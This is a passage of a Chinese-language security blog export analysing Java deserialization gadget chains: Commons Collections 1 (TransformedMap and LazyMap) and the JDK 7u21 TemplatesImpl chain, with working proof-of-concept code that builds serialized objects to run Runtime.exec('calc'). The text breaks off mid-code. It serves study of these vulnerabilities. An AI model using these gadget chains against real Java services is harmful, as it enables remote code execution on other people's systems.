javassist的功能除此之外还有很多","categories":[],"tags":[{"name":"java开发与安全","slug":"java开发与安全","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"}]},{"title":"Apache-Commons-Collections1 反序列化分析","slug":"Apache-Commons-Collections1 反序列化分析","date":"2021-06-28T13:51:11.039Z","updated":"2021-06-28T13:47:27.546Z","comments":true,"path":"2021/06/28/Apache-Commons-Collections1 反序列化分析/","link":"","permalink":"http://const27.com/2021/06/28/Apache-Commons-Collections1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/","excerpt":"","text":"Transformer Map 链RCE原理我在网上找到了一则利用代码，虽然这个利用代码很粗浅，并没有CC链1的触发过程，但是对于这条链的原理还是可见一斑的。 import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class test &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;), &#125;; Transformer transformerChain &#x3D; new ChainedTransformer(transformers); Map innerMap &#x3D; new HashMap(); Map outerMap &#x3D; TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(&quot;test&quot;, &quot;xxxx&quot;); &#125;&#125; TransformerMap类TransformerMap类是造成这个漏洞的原因之一 TransformerMap是apacheCommonsCollections里提供的一个数据类型。它可以修饰一个Map类型的对象。当修饰过的Map添加新元素时，它会调用在decorate里声明好的Trasnformer类的transform方法并传入新添的键名或值名。 Map DecoratedMap &#x3D; TransformedMap.decorate（Map,keyTransformer,valueTransformer） keyTransformer和valueTransformer分别指向不同的Transformer类。 Transformer类我们看一下Transformer类 可以发现它只是一个借口，他的方法需要其他子类实现。当TransformerMap在新添元素时就会调用decorate里设定好的Transformer类的transform方法。它的接口实现类有以下几个。 ConstantTransformer这个类主要的两个方法就是这俩了。 public ConstantTransformer(Object constantToReturn) &#123; this.iConstant &#x3D; constantToReturn; &#125; public Object transform(Object input) &#123; return this.iConstant; &#125; 没什么好说的，就是把传入的对象原原本本返回。 InvokerTransformer也是两个重要方法 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName &#x3D; methodName; this.iParamTypes &#x3D; paramTypes; this.iArgs &#x3D; args; &#125; public Object transform(Object input) &#123; if (input &#x3D;&#x3D; null) &#123; return null; &#125; else &#123; try &#123; Class cls &#x3D; input.getClass(); Method method &#x3D; cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var5) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;); &#125; catch (IllegalAccessException var6) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;); &#125; catch (InvocationTargetException var7) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7); &#125; &#125; &#125; 就是传入方法名，参数类型和参数，然后通过反射来执行这个方法 ChainedTransformer也是两个重要方法 public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers &#x3D; transformers; &#125; public Object transform(Object object) &#123; for(int i &#x3D; 0; i &lt; this.iTransformers.length; ++i) &#123; object &#x3D; this.iTransformers[i].transform(object); &#125; return object; &#125; 就是把传入的多个Transfomer类的transformer方法依次执行，每个transformer方法执行后返回的对象会被当做下一次执行的时候传入的参数。 通过以上信息，我们就可以清晰的看懂上面的payload了。先通过ConstantTransformer获得 Runtime类，再通过InvokerTransformer执行exec方法，然后通过ChainedTransformer将两个类串起来，让InvokerTransformer以ConstantTrasformer返回的Runtime类为参数执行exec方法，达到RCE的目的。 触发触发，我们选择的地方是sun.reflect.annotation.AnnotationInvocationHandler的readObject方法，反序列化的入口点基本都在这里：readobjcect方法。（注意8u71以下才能有触发点，之后的版本已被修复） 触发点代码。我们可以发现，它对传入的map的每一个value执行了setValue。 可以很明显的发现会对值进行transform方法。也就是相当于触发了一次Map.put()。接下来，就是payload构造时间了。 但是 AnnotationInvocationHandler 是内部类无法直接实例化，但它的父类InvocationHandler可以，我们可以通过反射得到 AnnotationInvocationHandler 构造方法，然后对其使用newInstance再向上转型为父类 InvocationHandler 。既然要获得对象，我们就应该关注一下它的构造方法。 AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123; Class[] var3 &#x3D; var1.getInterfaces(); if (var1.isAnnotation() &amp;&amp; var3.length &#x3D;&#x3D; 1 &amp;&amp; var3[0] &#x3D;&#x3D; Annotation.class) &#123; this.type &#x3D; var1; this.memberValues &#x3D; var2; &#125; else &#123; throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); &#125;&#125; 要传入两个参数，var2不用说了就是我们传入的Map，var1呢？是Annotation类，即所有注释类的接口。我们必须在此处传入一个注释类才能使if判断为真，才能把我们的参数中的Map传入。但是并不是所有注释类传进去都有效，注释类（实际上就是接口）必须有定义的方法才能正常触发反序列化。关于此点我们后面再详细谈谈。 因为再readObject方法里我们会执行**Map var3 = var2.memberTypes()**，我们看看memberTypes源码。 发现是返回构造方法中定义好的memberTypes属性。而这个memberTypes属性又和上一行的var2属性有关，var2属性又与getDecalredMethods有关…因此我才猜测 “注释类必须有定义的方法才能正常触发反序列化 “,但实际结果确实如此。目前找到的能够正常触发漏洞的注释类有 Target Retention SuppressWarnings .无一例外他们作为接口都定义了方法。而且在我翻阅一些参考文档后，发现确实是这样 另外一点需要注明的是，Runtime类没有继承Serialize接口，也就是说它不能被直接序列化。也就是说如果我们在transformer链里想直接通过有*new ConstantTransformer(Runtime.\\getRuntime*())**来获取Runtime对象时，会反序列化失败。但是Class类是有继承Serialize接口的，我们可以通过transformer链和反射来在反序列化阶段逐步创建Runtime类，继而解决这个问题 总结一下几个坑点：1.Runtime类不能被序列化\\2. AnnotationInvocationHandler 无法直接实例化，可通过反射获得对象3.注意在实例化 AnnotationInvocationHandler 时要传入定义好方法的注释类OK，以上知道了后就能试着写一下payload了（这个payload依旧不能正常执行，错误出处间代码注释，具体原因看下文）。 import java.io.*;import java.lang.annotation.*;import java.lang.reflect.*;import java.util.*;import org.apache.commons.collections.*;import org.apache.commons.collections.functors.*;import org.apache.commons.collections.map.TransformedMap;public class test2 &#123; public static void main(String[] args)&#123; try &#123; Transformer[] transformers &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;new String(&quot;getRuntime&quot;),new Class[0]&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,new Object[0]&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;new String(&quot;calc.exe&quot;)&#125;), &#125;; ChainedTransformer chain &#x3D; new ChainedTransformer(transformers); Map innermap &#x3D; new HashMap(); innermap.put(&quot;sc&quot;,&quot;b&quot;); &#x2F;&#x2F;不能执行的原因在这里，如果是put(&quot;value&quot;,&quot;a&quot;)就可以正常执行 Map outmap &#x3D; TransformedMap.decorate(innermap,null,chain); Class Annotation &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor AnnotationCons &#x3D; Annotation.getDeclaredConstructor(Class.class,Map.class); AnnotationCons.setAccessible(true); InvocationHandler InvocationHandler &#x3D; (InvocationHandler) AnnotationCons.newInstance(Target.class,outmap); ObjectOutputStream a &#x3D; new ObjectOutputStream(new FileOutputStream(new File(&quot;a.bin&quot;))); a.writeObject(InvocationHandler); a.close(); ObjectInputStream b &#x3D; new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;)); b.readObject(); b.close(); &#125; catch (Exception e)&#123;e.printStackTrace();&#125; &#125;&#125; 为什么不能执行，这原因与上面提到的“ 注意在实例化 AnnotationInvocationHandler 时要传入定义好方法的注释类 ”很有关联。因为涉及JVM的一些东西，我们不会怎么去深究，就是浅浅的看一下，做出一些推测。 首先我们关注到 AnnotationInvocationHandler 的readObject。 接下来就是复杂的推理了，建议先把各方法的意义弄明白发现必须要var7！=null才能正常触发反序列化漏洞，那么var7的来源是从(Map)var3中获得以(String)var6为键名的值。var6是var3中一项的键名。而var3的来源是(Annotation)var2的menberTypes,我们跟进这个方法。 那么var1就是AnnotationInvocationHandler的type属性了，而这个type属性在其构造方法中就定义好了，是传入的注释类。也就是说var1就是我们在实例 AnnotationInvocationHandler 时传入的注释类。结合以上流程，我们就可以知道这个过程是:从 实例 AnnotationInvocationHandler 时传入的注释类 中获取最后一个方法，然后把它编入为一个HashMap(以下称为注释方法Map)的一个键名并给予值。在readObject时会遍历传入的Map，如果在传入的Map中找到了一项的键名在注释方法Map中存在（即 在传入的Map中找到了一项的键名与实例化时传入的注释类的最后一个方法同名），则if条件为真，攻击成功。所以上面为什么put(“value”,任意)才能达成攻击的原因是， Target Retention SuppressWarnings 这三个注释类都有且只有一个方法名为value的方法。 分析完了。这个洞利用版本只能在8u71以前，比较古老无用。 LazyMap链RCE原理LazyMap的获得方法和TransfromerMap差不多。 Map innerMap &#x3D; new HashMap(); Map outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);public Object get(Object key) &#123; if (!super.map.containsKey(key)) &#123; Object value &#x3D; this.factory.transform(key); super.map.put(key, value); return value; &#125; else &#123; return super.map.get(key); &#125; 在对LazyMap使用get方法时，它会执行this.factory.transform(key),而this.factory.transform如果去跟进分析的话，实质上就是调用我们在decorate传进去的Transformer类。 触发LazyMap的触发点也在 AnnotationInvocationHandler 中，但不是在readObject方法，而是在invoke方法。invoke方法中有一行 Object var6 &#x3D; this.memberValues.get(var4); 其中this.memberVales是在构造方法中定义为传入的Map。 那么invoke方法要怎么才能触发呢？答案是动态代理。熟悉动态代理的朋友肯定直到，invoke方法时动态代理中的一个特殊的方法，在代理类中无论执行什么方法，实质上都是在执行invoke方法。 那么接下来就是骚思路了：我们通过反射和向上转型得到一个 AnnotationInvocationHandler(Class var1, Map var2) 对象。构建一个Map的代理类，其第三个参数是刚刚得到的 AnnotationInvocationHandler 对象，再故技重施将其通过向上转型得到一个 AnnotationInvocationHandler 对象。当该对象反序列化执行readObjct方法时，会执行一下entryset方法 本质上来说，是对一个代理类执行了一下entrySet方法，即执行了代理类的invoke方法，又因为代理类的第三个参数填入的是 AnnotationInvocationHandler 对象，其内部已经写好了invoke方法，所以此处执行的代理类的invoke方法即 AnnotationInvocationHandler 对象的invoke方法，继而触发了get方法，继而触发了漏洞。这是一个很妙的地方 多说无益，整paylaod吧 import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.annotation.Retention;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class test2 &#123; public static void main(String[] args) throws Exception &#123; org.apache.commons.collections.Transformer[] transformers &#x3D; new org.apache.commons.collections.Transformer[]&#123; &#x2F;&#x2F; 包装对象 new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123; &quot;getRuntime&quot;, null, &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123; null, null, &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123; &quot;calc&quot; &#125;), &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers); Map innermap &#x3D; new HashMap(); Map outermap &#x3D; LazyMap.decorate(innermap, chainedTransformer); Class clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor cons &#x3D; clazz.getDeclaredConstructor(Class.class,Map.class); cons.setAccessible(true);&#x2F;&#x2F;妙处 InvocationHandler handler &#x3D; (InvocationHandler) cons.newInstance(Override.class,outermap);&#x2F;&#x2F;获得一个AnnotationInvocationHandler对象 Map Prox &#x3D; (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);&#x2F;&#x2F;创建一个Map的代理类，其代理方法为AnnotationInvocationHandler对象里的invoke方法 InvocationHandler handler1 &#x3D; (InvocationHandler) cons.newInstance(Override.class,Prox); &#x2F;&#x2F;将代理Map传入，当代理Map被执行任一方法时，执行invoke方法&#x2F;&#x2F; ObjectOutputStream a &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;a.bin&quot;)); a.writeObject(handler1); ObjectInputStream b &#x3D; new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;)); b.readObject(); &#125;&#125;","categories":[],"tags":[{"name":"java开发与安全","slug":"java开发与安全","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"}]},{"title":"7u21链浅析","slug":"7u21链浅析","date":"2021-06-28T13:51:11.037Z","updated":"2021-06-28T13:48:09.627Z","comments":true,"path":"2021/06/28/7u21链浅析/","link":"","permalink":"http://const27.com/2021/06/28/7u21%E9%93%BE%E6%B5%85%E6%9E%90/","excerpt":"","text":"简介jdk7u21 链，是一个不需要借助第三方库就能实现的链。影响版本&lt;=7u21 分析from ysonerial我们先来看看ysonerial里的payload是怎么写的，然后沿着其思路进行分析 public Object getObject(String command) throws Exception &#123; Object templates &#x3D; Gadgets.createTemplatesImpl(command); String zeroHashCodeStr &#x3D; &quot;f5a5a608&quot;; HashMap map &#x3D; new HashMap(); map.put(zeroHashCodeStr, &quot;foo&quot;); InvocationHandler tempHandler &#x3D; (InvocationHandler)Reflections.getFirstCtor(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).newInstance(Override.class, map); Reflections.setFieldValue(tempHandler, &quot;type&quot;, Templates.class); Templates proxy &#x3D; (Templates)Gadgets.createProxy(tempHandler, Templates.class, new Class[0]); LinkedHashSet set &#x3D; new LinkedHashSet(); set.add(templates); set.add(proxy); Reflections.setFieldValue(templates, &quot;_auxClasses&quot;, (Object)null); Reflections.setFieldValue(templates, &quot;_class&quot;, (Object)null); map.put(zeroHashCodeStr, templates); return set;&#125; TemplatesImpl我们看到，ysonerial的payload上来就通过Gadgets.createTemplatesImpl(command) 试图创建一个TemplatesImpl类。createTemplatesImpl源码如下，我们发现创建TemplatesImpl类后又通过反射和javassist做了许多操作。 public static &lt;T&gt; T createTemplatesImpl(String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory) throws Exception &#123; T templates &#x3D; tplClass.newInstance(); ClassPool pool &#x3D; ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class)); pool.insertClassPath(new ClassClassPath(abstTranslet)); CtClass clazz &#x3D; pool.get(Gadgets.StubTransletPayload.class.getName()); String cmd &#x3D; &quot;java.lang.Runtime.getRuntime().exec(\\&quot;&quot; + command.replaceAll(&quot;\\\\\\\\&quot;, &quot;\\\\\\\\\\\\\\\\&quot;).replaceAll(&quot;\\&quot;&quot;, &quot;\\\\\\&quot;&quot;) + &quot;\\&quot;);&quot;; clazz.makeClassInitializer().insertAfter(cmd); clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime()); CtClass superC &#x3D; pool.get(abstTranslet.getName()); clazz.setSuperclass(superC); byte[] classBytes &#x3D; clazz.toBytecode(); Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class)&#125;); Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;); Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance()); return templates;&#125; 那么为什么要创建这个类并且调用反射和javassist机制呢？先不急，我们看一下TemplatesImpl源码。 首先TemplatesImpl类中有个方法defineTransletClasses，它的主要代码如下 private byte[][] _bytecodes &#x3D; (byte[][])null;private void defineTransletClasses() throws TransformerConfigurationException &#123; if (this._bytecodes &#x3D;&#x3D; null) &#123; ..... &#125; else &#123; TemplatesImpl.TransletClassLoader loader &#x3D; (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader()); &#125; &#125;); try &#123; int classCount &#x3D; this._bytecodes.length; this._class &#x3D; new Class[classCount]; for(int i &#x3D; 0; i &lt; classCount; ++i) &#123; this._class[i] &#x3D; loader.defineClass(this._bytecodes[i]); \\\\将_bytecodes中的所有字节通过defineClass转化为一个类 Class superClass &#x3D; this._class[i].getSuperclass(); if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; this._transletIndex &#x3D; i; &#125; else &#123; this._auxClasses.put(this._class[i].getName(), this._class[i]); &#125; &#125; &#125; 也就是说通过这个方法可以将_bytecodes数组中的字节还原成一个类，存储到_class变量中。接下来如果我们能找到调用defineTransletClasses方法并执行了_class[].newinstance() 这样的的代码的方法，就能实例化从字节得到的类了，从而就能执行类中的静态代码块和构造函数了！所以接下来我们需要去寻找这种方法。通过搜索defineTransletClasses，我们找到了有如下三个方法调用了defineTransletClasses方法： getTransletInstancegetTransletIndexgetTransletClasses 其中，getTransletInstance方法是唯一符合“调用了defineTransletClasses且有_class[].newinstance()”的方法，其代码如下 private Translet getTransletInstance() throws TransformerConfigurationException &#123; ErrorMsg err; try &#123; if (this._name &#x3D;&#x3D; null) &#123; return null; &#125; else &#123; if (this._class &#x3D;&#x3D; null) &#123; this.defineTransletClasses(); &#125; AbstractTranslet translet &#x3D; (AbstractTranslet)this._class[this._transletIndex].newInstance(); \\\\here translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(this._useServicesMechanism); if (this._auxClasses !&#x3D; null) &#123; translet.setAuxiliaryClasses(this._auxClasses); &#125; return translet; &#125; 那么，getTransletInstance是一个private方法，我们不能直接调用它，在那里能去调用它呢？答案是newTransformer方法 public synchronized Transformer newTransformer() throws TransformerConfigurationException &#123; TransformerImpl transformer &#x3D; new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory); \\\\here········ &#125; OK.我们找到了触发7u21链的一个核心点了。我们写个小demo来通过TemplatesImpl实现代码执行小demo的实现思路为：通过javassist动态生成一个恶意类（构造方法或者静态代码块有恶意代码），然后通过反射生成一个TemplatesImpl对象并设置各个变量的值，然后调用一下TemplatesImpl对象的newTransformer方法即可造成代码执行，代码如下 public class test&#123; public static void main(String[] args) throws Exception &#123; ClassPool pool &#x3D; ClassPool.getDefault(); CtClass cc &#x3D; pool.makeClass(&quot;evilclass&quot;); String cmd &#x3D; &quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); \\\\向静态代码块插入恶意代码，插入到构造函数也可以 cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); \\\\需设置此项才能实现newinstance，具体原因请看defineTransletClasses和getTransletInstance源码 cc.setName(&quot;evilClass&quot;); byte[] evilbytes &#x3D; cc.toBytecode(); byte[][] targetByteCodes &#x3D; new byte[][]&#123;evilbytes&#125;; TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance(); Class clazz &#x3D; TemplatesImpl.class.newInstance().getClass(); Field[] Fields &#x3D; clazz.getDeclaredFields(); for (Field Field : Fields) &#123; &#x2F;&#x2F;遍历Fields数组 try &#123; Field.setAccessible(true); &#x2F;&#x2F;对数组中的每一项实现私有访问 if(Field.getName()&#x3D;&#x3D;&quot;_bytecodes&quot;)&#123; Field.set(templates,targetByteCodes); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_class&quot;)&#123; Field.set(templates,null); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_name&quot;)&#123; Field.set(templates,&quot;abc&quot;); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_tfactory&quot;)&#123; Field.set(templates,new TemplatesImpl()); &#125; &#125; catch (Exception e) &#123;&#125; &#125; templates.newTransformer(); &#125;&#125; 但仅仅是这样，肯定是不够的。 AnnotationInvocationHandler我们继续看ysoserial源码可以看到动用了AnnotationInvocationHandler这个东西.这个类原本的作用是作为Annotation 类的动态代理 我们把目光聚焦于invoke方法——动态代理的核心 public Object invoke(Object var1, Method var2, Object[] var3) &#123; String var4 &#x3D; var2.getName(); Class[] var5 &#x3D; var2.getParameterTypes(); if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length &#x3D;&#x3D; 1 &amp;&amp; var5[0] &#x3D;&#x3D; Object.class) &#123; return this.equalsImpl(var3[0]); &#125; .......... &#125; 它会检测传入的方法中是否有符合 名为equals，只有一个Object类型参数。若是，则调用equalsImpl方法并传入方法中的参数。跟进equalsimpl方法 private Boolean equalsImpl(Object var1) &#123; if (var1 &#x3D;&#x3D; this) &#123; return true; &#125; else if (!this.type.isInstance(var1)) &#123; return false; &#125; else &#123; Method[] var2 &#x3D; this.getMemberMethods(); int var3 &#x3D; var2.length; for(int var4 &#x3D; 0; var4 &lt; var3; ++var4) &#123; Method var5 &#x3D; var2[var4]; String var6 &#x3D; var5.getName(); Object var7 &#x3D; this.memberValues.get(var6); Object var8 &#x3D; null; AnnotationInvocationHandler var9 &#x3D; this.asOneOfUs(var1); if (var9 !&#x3D; null) &#123; var8 &#x3D; var9.memberValues.get(var6); &#125; else &#123; try &#123; var8 &#x3D; var5.invoke(var1); \\\\here &#125; catch (InvocationTargetException var11) &#123; return false; &#125; catch (IllegalAccessException var12) &#123; throw new AssertionError(var12); &#125; &#125; if (!memberValueEquals(var7, var8)) &#123; return false; &#125; &#125; return true; &#125;&#125; 发现会invoke 传入参数中的所有方法。那么接下来我们就可以按照下面的思路写一个命令执行小demo: 创建一个包含恶意代码的TemplatesImpl实例，通过AnnotationInvocationHandler创建任意一个代理对象，然后代理对象调用equals方法传入参数为恶意TemplatesImpl对象，即可造成恶意代码执行看到这里一定一头雾水，看看demo也许会好一点 public class test&#123; public static void main(String[] args) throws Exception &#123; ClassPool pool &#x3D; ClassPool.getDefault(); CtClass cc &#x3D; pool.makeClass(&quot;evilclass&quot;); String cmd &#x3D; &quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;; CtConstructor cons &#x3D; new CtConstructor(new CtClass[]&#123;&#125;,cc); cons.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;); cc.addConstructor(cons); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); cc.setName(&quot;evilClass&quot;); byte[] evilbytes &#x3D; cc.toBytecode(); byte[][] targetByteCodes &#x3D; new byte[][]&#123;evilbytes&#125;; TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance(); Class clazz &#x3D; TemplatesImpl.class.newInstance().getClass(); Field[] Fields &#x3D; clazz.getDeclaredFields(); for (Field Field : Fields) &#123; &#x2F;&#x2F;遍历Fields数组 try &#123; &#x2F;&#x2F;执行get()方法时需抛出IllegalAccessException错误 Field.setAccessible(true); &#x2F;&#x2F;对数组中的每一项实现私有访问 if(Field.getName()&#x3D;&#x3D;&quot;_bytecodes&quot;)&#123; Field.set(templates,targetByteCodes); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_class&quot;)&#123; Field.set(templates,null); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_name&quot;)&#123; Field.set(templates,&quot;abc&quot;); &#125; if(Field.getName()&#x3D;&#x3D;&quot;_tfactory&quot;)&#123; Field.set(templates,new TemplatesImpl()); &#125; &#125; catch (Exception e) &#123;&#125; &#125; &#x2F;&#x2F;以上代码生成了恶意TemplatesImpl对象templates Map map &#x3D; new HashMap(); final Constructor&lt;?&gt; ctor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0]; &#x2F;&#x2F;获得AnnotationInvocationHandler构造方法，方便获得它一个实例 ctor.setAccessible(true); InvocationHandler invocationHandler &#x3D; (InvocationHandler) ctor.newInstance(Templates.class, map); &#x2F;&#x2F;这里有个问题，为什么要传入Templates类对象而不是TemplatesImpl Object proxy &#x3D; Proxy.newProxyInstance(null, Object.class.getInterfaces(), invocationHandler); \\\\反正创建一个AnnotationInvocationHandler的代理对象就行了，前两个参数都不用怎么管 proxy.equals(templates); &#x2F;&#x2F;恶意代码执行 &#125;&#125; 我们慢慢看看逻辑，在proxy.equals处下断点，调试毫无疑问会进入到此处：AnnotationInvocationHandler的invoke方法。 然后参数符合if判断，调用equalsImpl方法，并传入参数为恶意TemplatesImpl对象，接下来就是进入反射调用处 遍历var2变量中的方法，并由我们的恶意对象来执行。 ————此处插一下var2变量的来历 注意此处的getMemberMethods方法，它实质上是通过反射获得this.type中的所有方法。而this.type是在该对象构造方法中传入的第一个参数。 getMemberMethods： 构造方法： ————回到正题 由于我们通过反射传入构造方法的第一个参数是Templates.class，所以它会遍历Templates类中的所有方法。这个类其实是TemplatesImpl的接口类，它的代码如下 所以var2中存储的方法只有两个，newTransformer和getOutputProperties。然后当遍历到newTransformer方法时，就会通过反射调用达到 eviltemplatesImpl.newTransformer() 的效果，从而导致恶意TemplatesImpl对象中的恶意代码被执行。 这里承接上面说的，为什么初始化AnnotationInvocationHandler对象时传入的第一个参数（即this.type)是Templates.class，而不是TemplatesImpl.class诚然，这两个类对象都有方法newTransformer。但是如果传入TemplatesImpl.class，在遍历其中方法并通过反射执行时会出现错误：equalsImpl中的反射调用是不传入参数的 而TemplatesImpl中有许多需要传入参数才能被正常使用的方法，如果不传入参数就反射调用就会抛出异常，以至于在遍历到newTransformer方法前就会抛出异常，从而导致代码执行不被实现。 仅仅是这样，也还是不够的，我们还是得手动调用equals才能导致代码执行，反序列化点在哪里？ LinkedHashSetysoserial的payload中出现了此类。 LinkedHashSet继承自HashSet类，它的readObject方法也是从HashSet继承而来的。我们看看readObject方法的构造 private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; var1.defaultReadObject(); int var2 &#x3D; var1.readInt(); float var3 &#x3D; var1.readFloat(); this.map &#x3D; (HashMap)(this instanceof LinkedHashSet ? new LinkedHashMap(var2, var3) : new HashMap(var2, var3)); int var4 &#x3D; var1.readInt(); for(int var5 &#x3D; 0; var5 &lt; var4; ++var5) &#123; Object var6 &#x3D; var1.readObject(); this.map.put(var6, PRESENT); &#125; &#125;&#125; 它的主要亮点在for循环里面：遍历传入的序列化对象，将其反序列化后，再传入put方法 所以我们再来跟进一下map.put方法 public V put(K var1, V var2) &#123; if (var1 &#x3D;&#x3D; null) &#123; return this.putForNullKey(var2); &#125; else &#123; int var3 &#x3D; this.hash(var1); int var4 &#x3D; indexFor(var3, this.table.length); for(HashMap.Entry var5 &#x3D; this.table[var4]; var5 !&#x3D; null; var5 &#x3D; var5.next) &#123; Object var6; if (var5.hash &#x3D;&#x3D; var3 &amp;&amp; ((var6 &#x3D; var5.key) &#x3D;&#x3D; var1 || var1.equals(var6))) &#123; &#x2F;&#x2F;here Object var7 &#x3D; var5.value; var5.value &#x3D; var2; var5.recordAccess(this); return var7; &#125; &#125; ++this.modCount; this.addEntry(var3, var1, var2, var4); return null; &#125;&#125; 注意我们添加注释那一行，有一个var1.equals(var6))) 其中var1和var6我们都是可以控制的：var1即传入的反序列化对象(恶意TemplatesImpl)，var6实际上也是我们传入的反序列化对象（恶意AnnotationInvocationHandler代理对象）。 但是想要执行var1.equals(var6))) 则必须要让 var5.hash == var3 为true 且 (var6 = var5.key) == var1为false.怎么做到呢？ 注意put方法的第5行，对传入的反序列化对象调用了hash方法。我们跟进hash方法 final int hash(Object var1) &#123; int var2 &#x3D; 0; if (this.useAltHashing) &#123; if (var1 instanceof String) &#123; return Hashing.stringHash32((String)var1); &#125; var2 &#x3D; this.hashSeed; &#125; var2 ^&#x3D; var1.hashCode(); &#x2F;&#x2F;here var2 ^&#x3D; var2 &gt;&gt;&gt; 20 ^ var2 &gt;&gt;&gt; 12; return var2 ^ var2 &gt;&gt;&gt; 7 ^ var2 &gt;&gt;&gt; 4;&#125; 发现会执行传入的参数对象的hashCode()方法当我们传入的参数为恶意AnnotationInvocationHandler代理对象时，会调用代理对象中的invoke方法。对于AnnotationInvocationHandler而言当判断到执行hashCode方法时，实质上会执行AnnotationInvocationHandler中的hashCodeImpl方法 我们跟进hashCodeImpl private int hashCodeImpl() &#123; int var1 &#x3D; 0; Entry var3; for(Iterator var2 &#x3D; this.memberValues.entrySet().iterator(); var2.hasNext(); var1 +&#x3D; 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123; var3 &#x3D; (Entry)var2.next(); &#125; return var1; &#125;上面是真实代码，比较难看，所以借鉴了一下别人对其进行修改后的代码，方便我们进行分析private int hashCodeImpl() &#123; int result &#x3D; 0; &#x2F;&#x2F; 遍历 memberValues Iterator itr &#x3D; this.memberValues.entrySet().iterator(); for( ;itr.hasNext(); ) &#123; Entry entry &#x3D; (Entry)itr.next(); String key &#x3D; ((String)entry.getKey()); Object value &#x3D; entry.getValue(); 